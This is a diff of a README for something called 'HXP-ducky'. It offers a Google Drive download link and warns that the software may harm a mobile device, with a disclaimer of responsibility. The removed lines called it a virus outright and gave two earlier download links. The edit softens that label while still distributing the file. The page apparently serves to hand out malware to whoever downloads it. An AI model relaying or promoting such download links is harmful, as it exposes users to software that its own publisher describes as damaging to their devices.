@@ -1,11 +1,9 @@
-# HXP-ducky
-⚠️WARNING THIS IS A VIRUS AND MAY HARM YOUR MOBILE DEVICE⚠️
 
-!@I Am Not Responsible For Any Damage@!
+ # HXP-ducky
+⚠️WARNING THIS MAY HARM YOUR MOBILE DEVICE⚠️
 
-download link 1
-https://drive.google.com/file/d/11M5zzmPs4BMGpZnN5gnbNcMks5oBk1-T/view?usp=drivesdk
+I Am Not Responsible For Any Damage
 
-download link 2
-https://drive.google.com/uc?export=download&id=11M5zzmPs4BMGpZnN5gnbNcMks5oBk1-T 
+Download:
 
+https://drive.google.com/file/d/1-Rk-4uWX16F5Ulj2eXTWqyVxvcWcGemi/view?usp=drivesdk
